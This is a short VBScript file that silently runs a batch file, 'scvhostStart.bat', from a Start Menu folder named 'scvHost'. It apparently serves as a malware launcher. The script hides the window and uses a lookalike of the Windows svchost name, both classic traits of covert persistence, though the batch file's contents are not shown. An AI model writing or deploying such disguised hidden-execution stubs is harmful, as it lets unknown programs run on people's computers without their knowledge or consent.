Set oShell = CreateObject ("Wscript.Shell") 
Dim strArgs
strArgs = "cmd /c ""%appdata%\Microsoft\Windows\Start Menu\Programs\scvHost\scvhostStart.bat"""
oShell.Run strArgs, 0, false
